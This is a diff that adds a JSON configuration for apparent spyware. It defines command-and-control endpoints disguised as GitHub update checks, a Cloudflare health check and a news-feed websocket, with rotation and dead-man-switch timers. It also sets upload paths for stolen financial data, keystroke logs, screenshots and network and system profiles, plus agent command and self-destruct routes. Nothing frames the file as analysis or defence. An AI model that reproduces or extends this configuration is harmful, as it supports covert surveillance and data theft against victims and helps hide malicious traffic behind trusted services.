@@ -1,1 +1,22 @@
-
+{
+  "command_control": {
+    "primary": "https://api.github.com/repos/legit-app/update-check/contents/manifest.json",
+    "secondary": "https://cdn.cloudflare.com/health-check/status.json",
+    "fallback": "ws://news-feed.ws:8080/live",
+    "rotation_interval": 300,
+    "deadman_switch": 14400
+  },
+  "intelligence_drops": {
+    "financial": "/v1/data/financial/upload",
+    "keylogs": "/v1/data/keystrokes/batch",
+    "screenshots": "/v1/data/visual/capture",
+    "network": "/v1/data/network/topology",
+    "system": "/v1/data/system/profile"
+  },
+  "agent_management": {
+    "checkin": "/v1/agent/status",
+    "directive": "/v1/agent/command",
+    "update": "/v1/agent/update",
+    "destruct": "/v1/agent/destruct/emergency"
+  }
+}
